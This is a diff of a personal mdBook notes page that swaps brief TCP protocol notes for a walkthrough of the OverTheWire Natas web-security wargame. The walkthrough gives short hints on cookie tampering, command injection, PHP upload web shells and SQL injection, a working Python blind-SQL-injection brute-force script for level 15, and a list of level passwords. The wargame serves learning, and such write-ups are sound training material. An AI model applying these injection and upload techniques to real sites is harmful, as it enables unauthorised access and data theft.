@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>tcp - Notes</title>
+        <title>natas_levels - Notes</title>
 
 
         <!-- Custom HTML head -->
@@ -86,7 +86,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item "><a href="../notes/rust_notes.html"><strong aria-hidden="true">1.</strong> rust_notes</a></li><li class="chapter-item "><a href="../notes/python.html"><strong aria-hidden="true">2.</strong> python</a></li><li class="chapter-item "><a href="../notes/cmake.html"><strong aria-hidden="true">3.</strong> cmake</a></li><li class="chapter-item "><a href="../notes/project_euler.html"><strong aria-hidden="true">4.</strong> project_euler</a></li><li class="chapter-item "><a href="../notes/c_codes.html"><strong aria-hidden="true">5.</strong> c_codes</a></li><li class="chapter-item "><a href="../notes/cp_codes.html"><strong aria-hidden="true">6.</strong> cp_codes</a></li><li class="chapter-item "><a href="../notes/regex.html"><strong aria-hidden="true">7.</strong> regex</a></li><li class="chapter-item "><a href="../notes/concurrency.html"><strong aria-hidden="true">8.</strong> concurrency</a></li><li class="chapter-item "><a href="../notes/cpp-guidelines.html"><strong aria-hidden="true">9.</strong> cpp-guidelines</a></li><li class="chapter-item "><a href="../notes/hacking_basics.html"><strong aria-hidden="true">10.</strong> hacking_basics</a></li><li class="chapter-item "><a href="../notes/asm.html"><strong aria-hidden="true">11.</strong> asm</a></li><li class="chapter-item "><a href="../notes/registers.html"><strong aria-hidden="true">12.</strong> registers</a></li><li class="chapter-item "><a href="../notes/network_stack.html"><strong aria-hidden="true">13.</strong> network_stack</a></li><li class="chapter-item "><a href="../notes/traceroute.html"><strong aria-hidden="true">14.</strong> traceroute</a></li><li class="chapter-item "><a href="../notes/icmp.html"><strong aria-hidden="true">15.</strong> icmp</a></li><li class="chapter-item expanded "><a href="../notes/tcp.html" class="active"><strong aria-hidden="true">16.</strong> tcp</a></li><li class="chapter-item "><a href="../notes/ipv4.html"><strong aria-hidden="true">17.</strong> ipv4</a></li><li class="chapter-item "><a href="../notes/ipv6.html"><strong aria-hidden="true">18.</strong> ipv6</a></li><li class="chapter-item "><a href="../notes/dhcp.html"><strong aria-hidden="true">19.</strong> dhcp</a></li><li class="chapter-item "><a href="../notes/dhcpv6.html"><strong aria-hidden="true">20.</strong> dhcpv6</a></li><li class="chapter-item "><a href="../notes/natas_levels.html"><strong aria-hidden="true">21.</strong> natas_levels</a></li><li class="chapter-item "><a href="../notes/gdb.html"><strong aria-hidden="true">22.</strong> gdb</a></li><li class="chapter-item "><a href="../notes/linux.html"><strong aria-hidden="true">23.</strong> Kernel Contrib</a></li><li class="chapter-item "><a href="../notes/bash.html"><strong aria-hidden="true">24.</strong> bash</a></li></ol>
+                <ol class="chapter"><li class="chapter-item "><a href="../notes/rust_notes.html"><strong aria-hidden="true">1.</strong> rust_notes</a></li><li class="chapter-item "><a href="../notes/python.html"><strong aria-hidden="true">2.</strong> python</a></li><li class="chapter-item "><a href="../notes/cmake.html"><strong aria-hidden="true">3.</strong> cmake</a></li><li class="chapter-item "><a href="../notes/project_euler.html"><strong aria-hidden="true">4.</strong> project_euler</a></li><li class="chapter-item "><a href="../notes/c_codes.html"><strong aria-hidden="true">5.</strong> c_codes</a></li><li class="chapter-item "><a href="../notes/cp_codes.html"><strong aria-hidden="true">6.</strong> cp_codes</a></li><li class="chapter-item "><a href="../notes/regex.html"><strong aria-hidden="true">7.</strong> regex</a></li><li class="chapter-item "><a href="../notes/concurrency.html"><strong aria-hidden="true">8.</strong> concurrency</a></li><li class="chapter-item "><a href="../notes/cpp-guidelines.html"><strong aria-hidden="true">9.</strong> cpp-guidelines</a></li><li class="chapter-item "><a href="../notes/hacking_basics.html"><strong aria-hidden="true">10.</strong> hacking_basics</a></li><li class="chapter-item "><a href="../notes/asm.html"><strong aria-hidden="true">11.</strong> asm</a></li><li class="chapter-item "><a href="../notes/registers.html"><strong aria-hidden="true">12.</strong> registers</a></li><li class="chapter-item "><a href="../notes/network_stack.html"><strong aria-hidden="true">13.</strong> network_stack</a></li><li class="chapter-item "><a href="../notes/traceroute.html"><strong aria-hidden="true">14.</strong> traceroute</a></li><li class="chapter-item "><a href="../notes/icmp.html"><strong aria-hidden="true">15.</strong> icmp</a></li><li class="chapter-item "><a href="../notes/tcp.html"><strong aria-hidden="true">16.</strong> tcp</a></li><li class="chapter-item "><a href="../notes/ipv4.html"><strong aria-hidden="true">17.</strong> ipv4</a></li><li class="chapter-item "><a href="../notes/ipv6.html"><strong aria-hidden="true">18.</strong> ipv6</a></li><li class="chapter-item "><a href="../notes/dhcp.html"><strong aria-hidden="true">19.</strong> dhcp</a></li><li class="chapter-item "><a href="../notes/dhcpv6.html"><strong aria-hidden="true">20.</strong> dhcpv6</a></li><li class="chapter-item expanded "><a href="../notes/natas_levels.html" class="active"><strong aria-hidden="true">21.</strong> natas_levels</a></li><li class="chapter-item "><a href="../notes/gdb.html"><strong aria-hidden="true">22.</strong> gdb</a></li><li class="chapter-item "><a href="../notes/linux.html"><strong aria-hidden="true">23.</strong> Kernel Contrib</a></li><li class="chapter-item "><a href="../notes/bash.html"><strong aria-hidden="true">24.</strong> bash</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -169,47 +169,77 @@
 
                 <div id="content" class="content">
                     <main><div class="sidetoc"><nav class="pagetoc"></nav></div>
-                        <h1 id="tcp"><a class="header" href="#tcp">tcp</a></h1>
-<p>Transmission Control Protocol. Originated along with <a href="ipv4.html">ipv4</a> and hence the entire system is called TC/IP. It’s IP Protocol Number is 6.</p>
-<ul>
-<li>
-<p>IP packets may be lost, duplicated or out of order due to network congestion. TCP’s job is to rectify these errors.</p>
-</li>
-<li>
-<p>Since it focuses on reliable connection rather than fast connection it may take a lot of time to deliver the addresses.</p>
-</li>
-<li>
-<p>The sender keeps a timer and the receiver returns an acknowledgement on receiving the packet. If the timer expires before the acknowledgement is received, the packet is dropped immediately.</p>
-</li>
-<li>
-<p>Contains checksum verifications and sequence numbers to maintain data integrity.</p>
-</li>
-<li>
-<p>Can also selectively receive packets in broken sequences, say 1000-2000 and then 3000-3089. In this case, a flag called <strong>SACK</strong> (Selective Acknowledgement) can be set to 1, that allows the receiver to receive discontinuous blocks like these.</p>
-</li>
-<li>
-<p>Usually TCP waits for the full packet to be created before it it sent. However, <strong>PSH</strong> flag can be used for sending data immediately without waiting for the buffer to get full.</p>
-</li>
-</ul>
-<h2 id="vulns"><a class="header" href="#vulns">Vulns</a></h2>
-<ul>
-<li>
-<p>TCP Veto: Add a malicious packet in between with a sequence number same as the one going to arrive next. The next one is silently dropped a duplicate one. This isn’t highly controllable but very resistant to detection.</p>
-</li>
-<li>
-<p>Sequence prediction attacks: Create an entire sequence of packets and hijack the network to pretend you are the host.</p>
-</li>
-</ul>
+                        <h1 id="natas_levels"><a class="header" href="#natas_levels">natas_levels</a></h1>
+<h2 id="level-0"><a class="header" href="#level-0">Level 0</a></h2>
+<p>Password is in the comments.</p>
+<h2 id="level-1"><a class="header" href="#level-1">Level 1</a></h2>
+<p>Open inspect element through keyboard shortcut and remove the oncontextmenu line from the body tag.</p>
+<h2 id="level-2"><a class="header" href="#level-2">Level 2</a></h2>
+<p>When you view the source it shows a <code>files/pixel.png</code> element present on the page. That implies that there is a <code>file</code> folder in the server directory. Open the folder and see the file contents.</p>
+<h2 id="level-3"><a class="header" href="#level-3">Level 3</a></h2>
+<p>Open <code>robots.txt</code> and see the disallowed folder. This is checked by web crawlers to see what folders to <em>not</em> index.</p>
+<h2 id="level-4"><a class="header" href="#level-4">Level 4</a></h2>
+<p>Change referer by setting up a proxy to localhost and then using mitmproxy.</p>
+<h2 id="level-5"><a class="header" href="#level-5">Level 5</a></h2>
+<p>Change cookie by setting up localhost proxy and using mitmproxy.</p>
+<h2 id="level-6"><a class="header" href="#level-6">Level 6</a></h2>
+<p>The PHP sauce has the file that has the secret word necessary for revealing the password.</p>
+<h2 id="level-7"><a class="header" href="#level-7">Level 7</a></h2>
+<p>Check the HTML. It has a comment stating the page that has the password. Use that as a query in the URL to view the page.</p>
+<h2 id="level-8"><a class="header" href="#level-8">Level 8</a></h2>
+<p>Check the PHP source they are providing. Obtain the string from the hexadecimal, reverse it, and do a <code>base64</code> decode on it.</p>
+<h2 id="level-9"><a class="header" href="#level-9">Level 9</a></h2>
+<p>Comment out the query and grep the file that has the password since the input goes unsantized to passthru.</p>
+<h2 id="level-10"><a class="header" href="#level-10">Level 10</a></h2>
+<p>Do the same as before. Asterisk, period and forward slashes are not there in the filtered characters.</p>
+<h2 id="level-11"><a class="header" href="#level-11">Level 11</a></h2>
+<p><code>base64</code> decode the data cookie. XOR it with the given cookie to obtain the XOR key. Once the key is obtained use it to change the cookie value to yes and encrypt it. Then send that as the cookie.</p>
+<h2 id="level-12"><a class="header" href="#level-12">Level 12</a></h2>
+<p>Create a <code>.php</code> file to cat the password. Change the html to send a php through the form instead of a jpg. Send it and open it in the browser.</p>
+<h2 id="level-13"><a class="header" href="#level-13">Level 13</a></h2>
+<p>Add the JPEG magic bytes to the raw hexdump of the file. Then upload it.</p>
+<h2 id="level-14"><a class="header" href="#level-14">Level 14</a></h2>
+<p>Comment out the sql query ahead of the username.</p>
+<h2 id="level-15"><a class="header" href="#level-15">Level 15</a></h2>
+<pre><code class="language-py">#!/bin/python
+import requests,string
+
+url = &quot;http://natas15.natas.labs.overthewire.org&quot;
+auth_username = &quot;natas15&quot;
+auth_password = &quot;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&quot;
+
+characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+
+password = ''
+
+iter = 1
+
+while(True):
+    for i in characters:
+        uri = url + &quot;?debug=true&quot;
+        r = requests.get(uri, auth = (auth_username,auth_password), params = {'username':'natas16&quot; and BINARY SUBSTR(password, 1, ' + str(iter) + ')=&quot;' + password + i})
+        # print(r.text)
+        if &quot;This user exists&quot; in r.text:
+            iter += 1
+            password += i
+            print(password)
+</code></pre>
+<p>A <code>post</code> method can also be used for this.</p>
+<p>natas 8: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+natas 11: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+natas 12: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG</p>
+<p>natas 14: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP</p>
+<p>natas 16: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V</p>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                            <a rel="prev" href="../notes/icmp.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                            <a rel="prev" href="../notes/dhcpv6.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
 
-                            <a rel="next" href="../notes/ipv4.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                            <a rel="next" href="../notes/gdb.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
 
@@ -219,33 +249,17 @@
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                    <a rel="prev" href="../notes/icmp.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                    <a rel="prev" href="../notes/dhcpv6.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
 
-                    <a rel="next" href="../notes/ipv4.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a rel="next" href="../notes/gdb.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
             </nav>
 
         </div>
 
-        <!-- Livereload script (if served using the cli tool) -->
-        <script>
-            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
-            const socket = new WebSocket(wsAddress);
-            socket.onmessage = function (event) {
-                if (event.data === "reload") {
-                    socket.close();
-                    location.reload();
-                }
-            };
-
-            window.onbeforeunload = function() {
-                socket.close();
-            }
-        </script>
 
 
 
